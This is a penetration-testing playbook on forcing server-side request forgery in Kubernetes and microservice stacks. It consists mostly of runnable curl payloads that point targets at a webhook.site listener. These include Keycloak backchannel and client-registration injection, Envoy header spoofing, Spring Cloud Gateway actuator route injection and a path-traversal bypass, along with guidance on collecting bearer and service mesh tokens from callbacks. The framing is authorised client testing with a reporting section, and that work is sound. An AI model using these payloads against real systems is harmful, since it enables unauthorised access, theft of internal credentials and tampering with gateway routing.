# SSRF & Outbound Request Forcing (Black-Box)

Technique for attempting to force server-side outbound requests from K8s/microservice infrastructure to an attacker-controlled listener, in order to leak internal headers, service mesh tokens, or sidecar configuration.

## Setup

### Webhook Listener

Use webhook.site for quick disposable listeners:
```bash
# Create a new webhook token
WEBHOOK_UUID=$(curl -s -X POST "https://webhook.site/token" \
  -H "Content-Type: application/json" \
  -d '{"default_status":200,"default_content":"ok","default_content_type":"text/plain"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin).get('uuid',''))")

WEBHOOK="https://webhook.site/${WEBHOOK_UUID}"

# Check for incoming requests
curl -s "https://webhook.site/token/${WEBHOOK_UUID}/requests?sorting=newest" | python3 -c "
import sys, json
d = json.load(sys.stdin)
data = d.get('data', [])
print(f'Total requests received: {len(data)}')
for r in data[:5]:
    print(f\"  - {r.get('method')} from {r.get('ip')} | UA: {r.get('user_agent','?')[:60]}\")
"
```

Alternative: `python3 -m http.server 8888` on a public-facing host with `ngrok http 8888`.

## Test Vectors (ordered by likelihood)

### 1. Query Parameter Injection
Try common SSRF-triggering parameter names on discovered endpoints:
```bash
for param in url callback redirect_uri webhook_url notify_url return_url next callback_url source endpoint target fetch_url image_url; do
  curl -s -o /dev/null -w "%{http_code}" "${TARGET}?${param}=${WEBHOOK}" --max-time 10
done
```
**Key insight:** If all params return the same status code as the base URL, the endpoint ignores query params entirely (pure data dump). Move on quickly.

### 2. POST Body with URL Fields
```bash
curl -s -X POST "${TARGET}" \
  -H "Content-Type: application/json" \
  -d "{\"url\":\"${WEBHOOK}\",\"callback\":\"${WEBHOOK}\",\"endpoint\":\"${WEBHOOK}\"}"
```

### 3. Keycloak OIDC Vectors
```bash
# Backchannel logout (Keycloak makes outbound POST to the URI)
curl -X POST "${KEYCLOAK}/realms/{realm}/protocol/openid-connect/logout" \
  -d "backchannel_logout_uri=${WEBHOOK}/keycloak-backchannel"

# Client registration with callback URLs
curl -X POST "${KEYCLOAK}/realms/{realm}/clients-registrations/openid-connect" \
  -H "Content-Type: application/json" \
  -d "{\"redirect_uris\":[\"${WEBHOOK}/redirect\"],\"backchannel_logout_uri\":\"${WEBHOOK}/logout\"}"

# Token exchange with webhook as audience
curl -X POST "${KEYCLOAK}/realms/{realm}/protocol/openid-connect/token" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
  -d "subject_token=fake&audience=${WEBHOOK}&client_id=admin-cli"
```
**Common blocks:** Trusted hosts policy (403 on registration), token exchange disabled (400).

### 4. Envoy/Istio Header Manipulation
```bash
# Try to redirect Envoy's upstream routing
curl "${TARGET}" \
  -H "X-Envoy-Original-Dst-Host: ${WEBHOOK}" \
  -H "X-Envoy-External-Address: 10.0.0.1" \
  -H "X-Envoy-Force-Trace: true" \
  -H "X-B3-Sampled: 1"
```
**Confirming Istio presence:** Look for `x-envoy-upstream-service-time` in response headers.

### 5. Datadog/OpenTelemetry Trace Injection
```bash
# If CORS headers reveal x-datadog-* or Traceparent
curl "${TARGET}" \
  -H "X-Datadog-Trace-Id: 12345" \
  -H "X-Datadog-Origin: ${WEBHOOK}"
```
Won't trigger SSRF but confirms APM stack for report.

### 6. Open Redirect as SSRF Proxy
If a 302 redirect passes query params to an internal service:
```bash
# If /path redirects to internal-service.svc.cluster.local/path?params
curl "${TARGET}/path?redirect=${WEBHOOK}&url=${WEBHOOK}&next=${WEBHOOK}"
```
The internal service might follow the URL if it processes the param.

### 7. Spring Cloud Gateway Route Injection
```bash
# If actuator is accessible, inject a route pointing to webhook
curl -X POST "${GATEWAY}/actuator/gateway/routes/ssrf-test" \
  -H "Content-Type: application/json" \
  -d "{\"uri\":\"${WEBHOOK}\",\"predicates\":[{\"name\":\"Path\",\"args\":{\"pattern\":\"/ssrf/**\"}}]}"
```

### 8. Django Password Reset / Email Callbacks
```bash
# Some Django apps make HTTP callbacks for email verification
curl -X POST "${DJANGO_APP}/accounts/password/reset/" \
  -d "email=test@test.com"
```

## Indicators That SSRF Won't Work

| Signal | Meaning |
|--------|---------|
| All endpoints return same code regardless of params | Pure read-only data dumps, no input processing |
| CORS bug crashes all POST/PUT requests | Can't reach write logic (e.g., "Duplicate key Vary" in Spring) |
| Client registration returns 403 | Keycloak trusted hosts policy active |
| Token exchange returns 400 "not enabled" | Feature disabled server-side |
| All write endpoints behind auth (401/403) | No unauthenticated write surface |
| Host header injection returns 404 | Ingress validates Host strictly |

## What Success Looks Like

If a callback arrives at your webhook, examine:
1. **Source IP** — internal pod IP or external NAT? Reveals egress path
2. **Headers** — look for `Authorization: Bearer ...`, `X-Auth-App-Id`, service mesh tokens
3. **User-Agent** — reveals internal HTTP client (Java HttpClient, Python requests, etc.)
4. **Request body** — may contain internal data the service was trying to send

## Reporting

Even if SSRF fails, document:
- Which vectors were tested (shows thoroughness)
- What was confirmed about the architecture (Envoy, Datadog, etc.)
- Why SSRF failed (helps client understand their defenses ARE working)
- What would be needed for SSRF (authenticated access, internal network, etc.)

## Lessons from Real Engagements

1. **Spring Boot CORS bug as accidental DoS on writes**: "Duplicate key Vary (attempted merging values Origin and Origin)" crashes ALL POST/PUT before request processing. This means even legitimate authenticated users can't write. It's both a bug AND a security finding (accidental denial of write operations).

2. **500 ≠ endpoint exists** under Spring Boot with CORS bug: When the CORS filter crashes before routing, ALL paths under the prefix return 500 regardless of whether they exist. Cannot use response codes to enumerate real endpoints.

3. **Webhook.site rate limits**: Free tier allows ~500 requests. For high-volume testing, self-host with `python3 -m http.server` + ngrok.

4. **Path traversal + SSRF combo**: Even when `/onboarding/..;/actuator` bypasses path routing, a secondary ACL (IP whitelist, IAP, etc.) may still block. Document the traversal as a finding even if the final target is blocked — it proves the ingress ACL is bypassable.
